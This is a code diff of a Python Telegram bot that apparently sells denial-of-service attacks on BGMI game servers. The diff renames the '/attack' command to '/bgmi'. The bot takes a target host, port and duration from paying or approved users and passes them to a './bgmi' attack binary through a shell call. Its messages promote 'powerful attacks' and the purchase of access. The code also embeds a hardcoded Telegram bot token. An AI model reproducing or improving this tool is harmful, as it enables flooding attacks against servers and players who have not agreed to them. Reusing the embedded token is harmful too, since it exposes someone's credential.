@@ -5,8 +5,6 @@ import subprocess
 import datetime
 import os
 
-from keep_alive import keep_alive
-keep_alive()
 # Insert your Telegram bot token here
 bot = telebot.TeleBot('7283418311:AAG8JirJWjMQpCcpyF_MtPP6pw7ouGDTiLg')
 
@@ -490,14 +488,14 @@ def handle_bgmi(message):
             if time > 240:
                 response = "𝗘𝗿𝗿𝗼𝗿: 𝗧𝗶𝗺𝗲 𝗶𝗻𝘁𝗲𝗿𝘃𝗮𝗹 𝗺𝘂𝘀𝘁 𝗯𝗲 𝗹𝗲𝘀𝘀 𝘁𝗵𝗮𝗻 240."
             else:
-                record_command_logs(user_id, '/attack', target, port, time)
+                record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Join :- @Sivsiv11 # Call start_attack_reply function
                 full_command = f"./bgmi {target} {port} {time} 700"
                 subprocess.run(full_command, shell=True)
                 response = f"💥 Bgmi Attack Finished Now ⚡"
         else:
-            response = " 🚀👽Please Provide attack details in the following format:\n\n/attack <host> <Port> <Time>👽🚀"  # Join :- @Sivsiv11 # Updated command syntax
+            response = " 🚀👽Please Provide attack details in the following format:\n\n/bgmi <host> <Port> <Time>👽🚀"  # Join :- @Sivsiv11 # Updated command syntax
     else:
         response = " 🚫 Unauthorized Access! 🚫\n\nOops! It seems like you don't have permission to use the attack command. To gain access and unleash the power of attacks, you can:\n\n👉 Contact an Admin or the Owner for approval.\n🌟 Become a proud supporter and purchase approval\n💬 Chat with an admin now and level up your capabilities!\n\n🚀 Ready to supercharge your experience? Take action and get ready for powerful attacks!"
 
@@ -528,8 +526,8 @@ def show_command_logs(message):
 @bot.message_handler(commands=['start', 'menu'])
 def send_welcome(message):
     markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
-    btn1 = telebot.types.KeyboardButton('/attack')
-    btn2 = telebot.types.KeyboardButton('/resellership')
+    btn1 = telebot.types.KeyboardButton('/bgmi')
+    btn2 = telebot.types.KeyboardButton('/Aproove')
     btn3 = telebot.types.KeyboardButton('/myinfo')
     markup.add(btn1, btn2, btn3)
     bot.send_message(message.chat.id, "Welcome to the attack bot!", reply_markup=markup)
